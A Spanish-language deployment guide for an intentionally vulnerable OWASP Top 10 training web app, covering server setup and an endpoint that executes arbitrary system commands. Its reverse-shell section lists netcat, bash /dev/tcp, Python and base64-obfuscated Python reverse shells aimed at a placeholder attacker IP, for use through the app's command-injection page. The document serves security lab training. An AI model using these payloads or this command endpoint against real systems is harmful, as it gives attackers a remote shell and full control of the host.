# 🚨 Despliegue del Servidor Vulnerable Real

## ⚠️ ADVERTENCIA CRÍTICA
Este servidor ejecuta comandos arbitrarios del sistema. Solo úsalo en un entorno controlado y aislado.

## 📋 Instrucciones para Ubuntu Server

### 1. Actualizar el proyecto
```bash
cd ~/aplicaci-n-web-vulnerable-owasp-top-10
git pull origin main
```

### 2. Instalar dependencias del servidor
```bash
npm install
```

### 3. Construir la aplicación frontend
```bash
npm run build
```

### 4. Iniciar el servidor vulnerable
```bash
# Opción 1: Ejecutar directamente
npm run server

# Opción 2: Con PM2 (recomendado para producción)
sudo npm install -g pm2
pm2 start server.js --name "vulnerable-app"
pm2 save
pm2 startup
```

### 5. Configurar firewall para el puerto 3001
```bash
sudo ufw allow 3001
sudo systemctl reload ufw
```

## 🎯 Cómo usar la Reverse Shell REAL

### En tu Kali Linux (Atacante):
1. **Preparar el listener:**
   ```bash
   nc -lvnp 4444
   ```

2. **Cambiar IP en los comandos:**
   - Reemplaza `192.168.1.100` con la IP de tu Kali
   - Ejemplo: `nc -e /bin/bash TU_KALI_IP 4444`

### En la aplicación web:
1. Ir a "💀 Command Injection"
2. Usar comandos como:
   ```bash
   # Reverse shell con netcat
   nc -e /bin/bash TU_KALI_IP 4444
   
   # Reverse shell con bash
   bash -i >& /dev/tcp/TU_KALI_IP/4444 0>&1
   
   # Python reverse shell
   python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("TU_KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
   ```

## 🔧 Configuración Apache (Alternativa)
Si quieres seguir usando Apache como proxy:

```apache
<VirtualHost *:80>
    ServerName tu-dominio.com
    
    # Proxy al servidor Node.js
    ProxyPreserveHost On
    ProxyPass / http://localhost:3001/
    ProxyPassReverse / http://localhost:3001/
    
    # Habilitar módulos de proxy
    # sudo a2enmod proxy
    # sudo a2enmod proxy_http
</VirtualHost>
```

## 📊 Verificar que funciona

1. **Servidor funcionando:**
   ```bash
   curl http://localhost:3001/api/health
   ```

2. **Test básico:**
   ```bash
   curl -X POST http://localhost:3001/api/execute-command \
        -H "Content-Type: application/json" \
        -d '{"command": "whoami"}'
   ```

## 🚨 Comandos de prueba realistas

### Básicos:
- `whoami`
- `id`
- `pwd`
- `ls -la`
- `ps aux`
- `netstat -tulpn`

### Reverse Shells:
- `nc -e /bin/bash ATACANTE_IP 4444`
- `bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1`
- `python3 -c 'exec(__import__("base64").b64decode("aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiQVRBQ0FOVEVfSVAiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIp"))'`

## 🛡️ Medidas de seguridad
- Solo usar en red aislada
- Monitorear logs: `tail -f /var/log/apache2/error.log`
- Firewall restrictivo
- Snapshot del servidor antes de usar

## 🔄 Reiniciar servicios
```bash
# Reiniciar el servidor vulnerable
pm2 restart vulnerable-app

# O si usas npm directamente
pkill node
npm run server &
```